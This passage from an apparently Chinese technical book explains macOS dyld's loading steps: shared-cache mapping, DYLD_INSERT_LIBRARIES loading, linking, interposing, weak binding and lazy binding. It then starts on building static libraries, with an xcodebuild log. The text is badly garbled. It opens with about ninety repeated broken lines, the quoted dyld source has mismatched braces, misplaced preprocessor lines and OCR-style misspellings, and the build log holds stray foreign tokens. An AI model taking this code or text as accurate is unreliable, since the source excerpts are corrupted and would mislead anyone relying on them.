                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED

   </div>

int fd = openSharedCacheFile();
if ( fd != -1 ) {
    uint8_t firstPages[8192];
    if ( ::read(fd, firstPages, 8192) == 8192 ) {
        dyld_cache_header* header = (dyld_cache_header*)firstPages;
    #if _x86_64
        const char* magic = (sHaswell ? ARCH_CACHE_MAGIC_H : ARCH_CACHE_MAGIC);
    #else
        const char* magic = ARCH_CACHE_MAGIC;
    #endif
    if ( strcmp(header->magic, magic) == 0 ) {
        const dyld_cache_mapping_info* const fileMappingsStart =
            (dyld_cache_mapping_info*)&firstPages[header->mappingOffset];
        const dyld_cache_mapping_info* const fileMappingsEnd =
            &fileMappingsStart[header->mappingCount];
        shared_file_mapping_np_mappings[header->mappingCount+1]; // add room for code-sig
        if ( shared_region_map_and_slide_np(fd, mappingCount, mappings, codeSignatureMappingIndex, cacheSlide, slideInfo, slideInfoSize) == 0 ) {
            sSharedCache = (dyld_cache_header*)mappings[0].sfm_address;
            sSharedCacheSlide = cacheSlide;
            dyld::gProcessInfo->sharedCacheSlide = cacheSlide;
        }
        else {
            #if _IPHONE_OS_VERSION_MIN_REQUIRED
                throw "dyld shared cache could not be mapped";
        }
        #endif
        if ( gLinkContext.verboseMapping )
            dyld::log("dyld: shared cached file could not be mapped\n");
        }
    }
    else {
        if ( gLinkContext.verboseMapping )
            dyld::log("dyld: shared cached file is invalid\n");
    }
    else {
        if ( gLinkContext.verboseMapping )
            dyld::log("dyld: shared cached file cannot be read\n");
    }
    close(fd);
}
else {
    if ( gLinkContext.verboseMapping )
        dyld::log("dyld: shared cached file cannot be opened\n");
}

}
}
.....
}

共享缓存加载完毕后，接着进行动态库的版本化重载，这主要通过函数checkVersionedPaths()完成。该函数读取DYLD_VERSIONED_LIBRARY_PATH与DYLD_VERSIONED_FRAMEWORK_PATH环境变量，从这两个环境变量指定的路径中搜索动态库，如果路径中动态库的current_version字段比已经加载的dylib的版本新，就使用新版本的库替换掉旧版本的库。

# 4. 第四步，加载插入的动态库

这一步循环遍历DYLD_INSERT_LIBRARIES环境变量中指定的动态库列表，并调用loadInserted-Dylib()将其加载。该函数调用load()完成加载工作。load()会调用loadPhase0()尝试从文件加载，loadPhase0()会向下调用下一层Phase来查找动态库的路径，直到loadPhase6()。查找的顺序为DYLD_ROOT_PATH→LD_LIBRARY_PATH→DYLD_FRAMEWORK_PATH→原始路径→DYLD_FALLBACK_LIBRARY_PATH。找到后调用ImageLoaderMach0::instantiateFromFile()来实例化一个ImageLoader，之后调用checkandAddImage()验证映像并将其加入到全局映像列表中。如果loadPhase0()返回为空，则表示在路径中没有找到动态库，就会尝试从共享缓存中查找。如果找到就调用ImageLoaderMach0::instantiateFromCache()从缓存中加载，否则就抛出没找到映像的异常。部分代码片段如下：

ImageLoader* load(const char* path, const LoadContext& context)
{
    if (context.useSearchPaths && (gLinkContext.imageSuffix != NULL)) {
        if (realpath(path, realPath) != NULL) {
            path = realPath;
        }

        ImageLoader* image = loadPhase0(path, orgPath, context, NULL);
        if (image != NULL) {
            CRSetCrashLogMessage2(NULL);
            return image;
        }

        image = loadPhase0(path, orgPath, context, &exceptions);
    }
    if __IPHONE_OS_VERSION_MIN_REQUIRED && DYLD_SHARED_CACHE_SUPPORT && !TARGET_IPHONE_SIMULATOR {
        if ((image == NULL) && cacheablePath(path) && !context.dontLoad) {
            ...
            if ((myerr == ENOENT) || (myerr == 0)) {
                const macho_header* mhInCache;
                const char* pathInCache;
                long slideInCache;
                if (findInSharedCacheImage(resolvedPath, false, NULL, &mhInCache, &pathInCache, &slideInCache)) {
                struct stat stat_buf;
                bzero(&stat_buf, sizeof(stat_buf));
                try {
                    // 
                }
            }
        }
    }
}

image = ImageLoaderMach0::instantiateFromCache(mhInCache, pathInCache, slideInCache, stat_buf, gLinkContext);
image = checkandAddImage(image, context);
}
catch (...) {
    image = NULL;
}
}
}
#endif

.....
else {
    const char* msgStart = "no suitable image found. Did find:\";
    .....
    throw (const char*)fullMsg;
}

# 5. 第五步，链接主程序

这一步执行 $ \text{link()} $完成主程序的链接操作。该函数调用了ImageLoader自身的 $ \text{link()} $函数，对实例化的主程序的动态数据进行修正，达到让进程可用的目的。比较典型的就是主程序中的符号表修正操作，它的代码片段如下：

d ImageLoader::link(const LinkContext& context, bool forceLazysBound,
erUnload, const RPathChain& loaderRPaths)

.....
this->recursiveLoadLibraries(context, preflightOnly, loaderRPaths);

.....

.....

context.clearAllDepths();
this->recursiveUpdateDepth(context.imageCount());

this->recursiveRebase(context);

.....

.....

this->recursiveBind(context, forceLazysBound, neverUnload);

if (!context.linkingMainExecutable)
    this->weakBind(context); //现在是链接主程序，这里现在不会执行

.....

std::vector<DOFInfo> dofs;
this->recursiveGetDOFSections(context, dofs);
context.registerDOFs(dofs);

.....

.....

if (!context.linkingMainExecutable && (fgInterposingTuples.size() != 0)) {
    this->recursiveApplyInterposing(context); //现在是链接主程序，这里现在不会执行
}
.....
}

recursiveLoadLibraries()采用递归的方式加载程序依赖的动态库，加载的方法是调用context的loadLibrary指针方法。该方法在前面介绍过，是setContext()设置的libraryLocator()，该函数只是调用了load()来完成加载，load()加载动态库的过程在上一步已经分析过了。

接着调用recursiveUpdateDepth()对映像及其依赖库按列表方式进行排序。recursiveRebase()则对映像完成递归操作，该函数只是调用了虚函数doRebase()。doRebase()被ImageLoaderMach0重载，实际上只是将代码段设置成可写后调用了rebase()。在ImageLoaderMach0Compressed中，该函数读取映像动态链接信息的rebase_off与rebase_size来确定需要rebase的数据偏移与大小，然后逐个修正它们的地址信息。

recursiveBind()完成递归绑定符号表的操作。此处针对的是非延迟加载的符号表，核心是调用了doBind()。在ImageLoaderMachOCompressed中，该函数读取映像动态链接信息的bind_off与bind_size来确定需要绑定的数据偏移与大小，然后逐个进行绑定。绑定操作使用bindAt()函数，该函数调用resolve()解析完符号表后，会调用bindLocation()完成最终的绑定操作。需要绑定的符号信息有以下3种。

□ BIND_TYPE_POINTER：需要绑定的是一个指针。直接将计算好的新值赋值即可。

□ BIND_TYPE_TEXT_ABSOLUTE32：需要绑定的是一个32位的绝对地址。

□ BIND_TYPE_TEXT_PCREL32：重定位符号。需要使用新值减掉需要修正的地址值来计算出重定位值。

recursiveGetDOFSections()与registerDOFs()主要注册程序的DOF节区，供dtrace使用。

# 6. 第六步，链接插入的动态库

链接插入的动态库与链接主程序一样，都是使用 $  \text{link()}  $。插入的动态库列表是前面调用addImage()保存到sAllImages中的，之后，循环获取每一个动态库的ImageLoader，调用 $  \text{link()}  $对其进行链接。注意，sAllImages中保存的第一项是主程序的映像。

接下来调用每个映像的registerInterposing()方法，来注册动态库插入与调用applyInterposing()应用插入操作（也叫作符号地址替换）。registerInterposing()查找_DATA段的_interpose节区，找到需要应用插入操作的数据，然后做一些检查后，将要替换的符号与被替换的符号信息存入fgInterposingTuples列表中，供以后具体符号替换时查询。applyInterposing()调用了虚方法doInterpose()来做符号替换操作，在ImageLoaderMachO-Compressed中，实际是调用了eachBind()与eachLazyBind()，分别对常规符号和延迟加载符号进行应用插入操作。具体使用的是interposeAt()，该方法调用interposedAddress()在fgInterposingTuples中查找要替换的符号地址，找到后进行最终的符号地址替换。

# 7. 第七步，执行弱符号绑定

weakBind()函数执行弱符号绑定。首先通过调用context的getCoalescedImages()将sAllImages中所有含有弱符号的映像合并成一个列表，合并完成后调用initializeCoalIterator()对映像进行排序，排序完成后调用incrementCoalIterator()收集需要绑定的弱符号。incrementCoal-Iterator()是一个虚函数，在ImageLoaderMachOCompressed中，该函数读取映像动态链接信息的weak_bind_off与weak_bind_size来确定弱符号的数据偏移与大小，然后逐个计算它们的地址信息。之后调用getAddressCoalIterator()，按照映像的加载顺序在导出表中查找符号的地址，找到后调用updateUsesCoalIterator()执行最终的绑定操作。执行绑定的是bindLocation()，我们在前面讲过，此处不再赘述。

# 8. 第八步，执行初始化方法

执行初始化的方法是initializeMainExecutable()。该函数主要执行runInitializers()，它调用了ImageLoader的runInitializers()方法，最终迭代执行了ImageLoaderMach0的doInitialization()方法，后者主要调用doImageInit()和doModInitFunctions()，执行映像与模块中设置为init的函数和静态初始化方法。代码如下：

bool ImageLoaderMach0::doInitialization(const LinkContext& context)
{
    CRSetCrashLogMessage2(this->getPath());

    doImageInit(context);
    doModInitFunctions(context);

    CRSetCrashLogMessage2(NULL);

    return (fHasDashInit || fHasInitializers);
}

# 9. 第九步，查找入口点并返回

这一步调用主程序映像的getThreadPC()函数来查找主程序的LC_MAIN加载命令，获取程序的入口。如果没找到，就调用getMain()到LC_UNIXTHREAD加载命令中去找，找到后就跳到入口点指定的地址并返回。

到这里，dyld加载动态库的整个过程就完成了。

下面，我们再讨论一下延迟符号加载的技术细节。在所有拥有延迟加载符号的Mach-O文件里，符号表中一定有一个dyld_stub_helper符号，它是延迟符号加载的关键。延迟绑定符号的修正工作就是由它完成的。绑定符号信息可以使用Xcode提供的命令行工具dyldinfo来查看，执行以下命令可以查看Python的绑定信息：

xcrun dyldinfo -bind /usr/bin/python
for arch i386:
    bind information:
    segment section address type addend dylib

DATA ___cfstring 0x000040F0 pointer 0 CoreFoundation ___CFConstantStringClassReference
DATA ___cfstring 0x00004100 pointer 0 CoreFoundation ___CFConstantStringClassReference
DATA ___nl_symbol_ptr 0x00004010 pointer 0 CoreFoundation ___kCFAllocationNull
DATA ___nl_symbol_ptr 0x00004008 pointer 0 libSystem ___stack_chk_guard
DATA ___nl_symbol_ptr 0x0000400C pointer 0 libSystem ___environ
DATA ___nl_symbol_ptr 0x00004000 pointer 0 libSystem ___dyld_stub_binder
bind information:
segment section 'address' type addend dylib symbol
DATA ___cfstring 0x1000031D8 pointer 0 CoreFoundation ___CFConstantStringClassReference
DATA ___cfstring 0x1000031F8 pointer 0 CoreFoundation ___CFConstantStringClassReference
DATA ___got 0x100003010 pointer 0 CoreFoundation ___kCFAllocationNull
DATA ___got 0x100003000 pointer 0 libSystem ___stack_chk_guard
DATA ___got 0x100003008 pointer 0 libSystem ___environ
DATA ___nl_symbol_ptr 0x100003018 pointer 0 libSystem ___dyld_stub_binder

所有的延迟绑定符号都存储在_TEXT段的stubs节区。编译器在生成代码时创建的符号调用就生成在此节区中，该节区被称为“桩”节区。桩只是一小段临时使用的指令，在stubs中只是一条jmp跳转指令，跳转的地址位于_DATA段_la_symbol_ptr节区中，指向的是一段代码，类似于如下的语句：

push xxx
jmp yyy

xxx是符号在动态链接信息中延迟绑定符号数据的偏移值，yyy则是跳转到_TEXT段的stub_helper节区头部。此处的代码通常如下所示：

lea r11, qword [ds:zzz]
push r11
jmp qword [ds:imp__nl_symbol_ptr_dyld_stub_binder]

jmp跳转的地址是___DATA段中___nl_symbol_ptr节区，指向的是符号dyld_stub_binder()。该函数由dyld导出，实现位于dyld源代码的dyld_stub_binders文件中，调用dyld::fastBindLazySymbol()来绑定延迟加载的符号。而这是一个虚函数，实际上是调用ImageLoaderMachOCompressed的doBindFastLazySymbol()，该函数调用bindAt()解析并返回正确的符号地址，dyld_stub_binder()在最后跳转到符号地址去执行。这一步完成后，___DATA段___la_symbol_ptr节区中存储的符号地址就是修正后的地址了，下一次调用该符号时，就会直接跳转到真正的符号地址去执行，而不用dyld_stub_binder()来重新解析该符号了。

### 4.7 静态库

静态库与动态库都是Mach-O格式的文件，动态库使用.dylib作为文件的扩展名，静态库则使用.a作为文件的扩展名。在功能上，动态库通过动态链接的方式向其他程序提供接口，而静态库则将功能代码直接编译进目标Mach-O文件中去。多个程序使用同一个动态库并不会增加目标文件的大小，使用静态库则会将每份功能代码都复制到目标文件中。从运行效率上来说，动态库需要在加载后做符号绑定操作，而静态库代码直接在目标程序中运行。因此，理论上来讲，使用静态库的运行效率比动态库要高一些。

#### 4.7.1 构建静态库

Xcode提供了创建静态库的工程模板，创建静态库的方法与创建动态库几乎一样，唯一不同的是在项目设置时，Type选择Static。下面是与创建动态库一样的代码：

#import <Foundation/Foundation.h>

@interface mystaticlib : NSObject
-(void) hello;
@end

#import "mystaticlib.h"

@implementation mystaticlib
-(void) hello {
    NSLog(@"hello world");
}

@end

分别保存为mystaticlib.h与mystaticlib.m，然后使用xcodebuild编译会有如下输出：

$ xcodebuild
=== BUILD TARGET mystaticlib OF PROJECT mystaticlib WITH THE DEFAULT CONFIGURATION (Release) ===

Check dependencies

Write auxiliary files
write-file
/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/mystaticlib.build/Release
/mystaticlib.build/mystaticlib-generated-files.hmap
write-file
/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/mystaticlib.build/Release
/mystaticlib.build/mystaticlib-all-target-headers.hmap

.....
/bin/mkdir -p
/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/mystaticlib.build/Release
/mystaticlib.build/Objects-normal/x86_64
write-file
/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/mystaticlib.build/Release
/mystaticlib.build/Objects-normal/x86_64/mystaticlib.LinkFileList

CompileC build/mystaticlib.build/Release/mystaticlib.build/Objects-normal/x86_64/mystaticlib.0
mystaticlib/mystaticlib.m normal x86_64 objective-c com.apple.compilers.llvm.clang.1_0.compiler
cd /Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib
export LANG=en_US.US-ASCII
/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang -x
objective-c -arch x86_64 -fmessage-length=94 -fdiagnostics-show-note-include-stack
-fmacro-backtrace-limit=0 -fcolor-diagnostics -std=gnu99 -fobjc-arc -fmodules -gmodules
-fmodules-prune-interval=86400 -fmodules-prune-after=345600
-fbuild-session-file=/var/folders/rd/mts0362j0n92rq0z1cnmdb580000gn/C/org.llvm.clang/ModuleCache/Session.modulevalidation -fmodules-validate-once-per-build-session
-Wnon-modular-include-in-framework-module -Werror=non-modular-include-in-framework-module

-Wno-trigraphs -fpascal-strings -Os -fno-common -Wno-missing-field-initializers

-Wno-missing-prototypes -Werror=return-type -Wunreachable-code -Wno-implicit-atomic-properties
-Werror=deprecated-objc-isa-usage -Werror=objc-root-class -Wno-arc-repeated-use-of-weak
-Wduplicate-method-match -Wno-missing-braces -Wparentheses -Wswitch -Wunused-function
-Wno-unused-label -Wno-unused-parameter -Wunused-variable -Wunused-value -Wempty-body
-Wconditional-uninitialized -Wno-unknown-pragmas -Wno-shadow -Wno-four-char-constants
-Wno-conversion -Wconstant-conversion -Wint-conversion -Wbool-conversion -Wenum-conversion
-Wshorten-64-to-32 -Wpointer-sign -Wno-newline-eof -Wno-selector -Wno-strict-selector-match
-Wundeclared-selector -Wno-deprecated-implementations -DNS_BLOCK_生子
-DOBJC_OLD_DISPATCH_PROTOTYPES=0 -isysroot
/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.11.sd
k -fasm-blocks -fstrict-aliasing -Wprotocol -Wdeprecated-declarations -mmacosx-version-min=10.11 -g
-Wno-sign-conversion -iquote
/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/mystaticlib.build/Release
/mystaticlib.build/mystaticlib-generated-files.hmap
-I/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/mystaticlib.build/Relea
se/mystaticlib.build/mystaticlib-own-target-headers.hmap
-I/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/mystaticlib.build/Relea
se/mystaticlib.build/mystaticlib-all-target-headers.hmap -iquote
/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/mystaticlib.build/Release
/mystaticlib.build/mystaticlib-project-headers.hmap
-I/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/Release/include
-I/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/mystaticlib.build/Relea
se/mystaticlib.build/DerivedSources/x86_64
-I/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/mystaticlib.build/Relea
se/mystaticlib.build/DerivedSources
-F/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/Release -MMD -MT
dependencies -MF
/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/mystaticlib.build/Release
/mystaticlib.build/Objects-normal/x86_64/mystaticlib.d --வர்
/users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/mystaticlib.build/Release
/mystaticlib.build/Objects-normal/x86_64/mystaticlib.dia -c
/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/mystaticlib/mystaticlib.m -o
/users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/mystaticlib.build/Release
/mystaticlib.build/Objects-normal/x86_64/mystaticlib.o

Libtool build/Release/libmystaticlib.a normal x86_64
cd /Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib
export MACOSX_DEPLOYMENT_TARGET=10.11
/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/libtool
-static -arch_only x86_64 -syslibroot
/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.11.sdk
-L/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/Release -filelist
/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/mystaticlib.build/Release
/mystaticlib.build/Objects-normal/x86_64/mystaticlib.LinkFileList -o
/Users/macbook/Documents/macbook/macbook/code/chapter4/mystaticlib/build/Release/libmystaticlib.a

*** BUILD SUCCEEDED ***

整个编译过程分为：检查依赖（Check dependencies）、生成辅助文件（Write auxiliary files）、编译（CompileC）、打包生成库（Libtool）4步。最后打包生成库的环节使用的是Libtool工具，该工具除了生成静态库，也可以生成动态库。上一节生成动态库使用的链接器ld，它底层也是通过

   </div>

libtool来生成动态库的。最后注意，静态库不需要签名，静态库中的代码最终会被插入到目标程序中，由目标程序来签名。

#### 4.7.2 静态库格式

